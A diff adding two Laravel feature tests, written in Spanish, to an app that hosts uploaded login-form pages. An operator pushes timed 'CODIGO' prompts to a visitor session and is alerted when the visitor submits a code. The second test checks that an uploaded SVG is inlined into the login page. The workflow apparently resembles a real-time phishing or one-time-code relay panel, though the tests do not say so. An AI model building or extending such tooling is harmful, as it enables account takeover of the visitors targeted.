@@ -432,6 +432,58 @@ class ProjectModuleTest extends TestCase
         $this->assertMatchesRegularExpression('/data-code-signal="[1-9][0-9]*"/', $html);
     }
 
+    public function test_marcar_atendido_apaga_la_alarma_hasta_un_codigo_nuevo(): void
+    {
+        $admin = $this->admin();
+        $project = Project::create(['name' => 'Atend']);
+        $view = $project->views()->create(['name' => 'Codigo', 'slug' => 'codigo', 'html' => '<form></form>']);
+        $company = Company::create([
+            'empresa' => $project->name, 'registro' => 'REG-AT', 'fecha' => now(), 'last_activity_at' => now(),
+        ]);
+        $token = (string) \Illuminate\Support\Str::uuid();
+        $company->forceFill(['loading_token' => $token])->save();
+        $button = Button::create([
+            'label' => 'CODIGO', 'text' => 'c', 'project_view_id' => $view->id,
+            'expires_seconds' => 120, 'is_active' => true, 'sort_order' => 0,
+        ]);
+
+        // Llega el primer código → tarjeta morada (timed-reply).
+        $this->actingAs($admin)->post(route('api.companies.send', $company), ['button_id' => $button->id])->assertOk();
+        $this->postJson("/api/sitio/{$project->slug}/{$view->slug}/submit", ['data' => ['codigo' => 'AAA'], 'session' => $token])->assertCreated();
+        $html = $this->actingAs($admin)->get(route('companies.detail', $company))->getContent();
+        $this->assertStringContainsString('timed-reply', $html);
+
+        // Se marca "atendido" → ya no está morada.
+        $this->actingAs($admin)->post(route('companies.attend', $company))->assertOk();
+        $html = $this->actingAs($admin)->get(route('companies.detail', $company))->getContent();
+        $this->assertStringNotContainsString('timed-reply', $html);
+
+        // Llega OTRO código → vuelve a estar morada.
+        $this->actingAs($admin)->post(route('api.companies.send', $company), ['button_id' => $button->id])->assertOk();
+        $this->postJson("/api/sitio/{$project->slug}/{$view->slug}/submit", ['data' => ['codigo' => 'BBB'], 'session' => $token])->assertCreated();
+        $html = $this->actingAs($admin)->get(route('companies.detail', $company))->getContent();
+        $this->assertStringContainsString('timed-reply', $html);
+    }
+
+    public function test_incrusta_un_svg_subido(): void
+    {
+        $admin = $this->admin();
+        $this->actingAs($admin)->post(route('projects.store'), ['name' => 'ConSvg'])->assertRedirect();
+        $project = Project::firstWhere('name', 'ConSvg');
+
+        $html = '<form id="f"><img src="iconos/logo.svg"><input name="a"><button type="submit">Ir</button></form>';
+        $htmlFile = UploadedFile::fake()->createWithContent('index.html', $html);
+        $svg = UploadedFile::fake()->createWithContent('logo.svg', '<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>');
+
+        $this->actingAs($admin)->post(route('projects.views.store', $project), [
+            'name' => 'Login', 'files' => [$htmlFile, $svg],
+        ])->assertRedirect();
+
+        $view = $project->fresh('views')->views->first();
+        $this->assertStringContainsString('data:image/svg+xml;base64,', $view->html);
+        $this->assertStringNotContainsString('iconos/logo.svg', $view->html);
+    }
+
     public function test_un_boton_de_vista_normal_no_muestra_mensaje(): void
     {
         [$admin, $project] = $this->makeIntegratedProject();
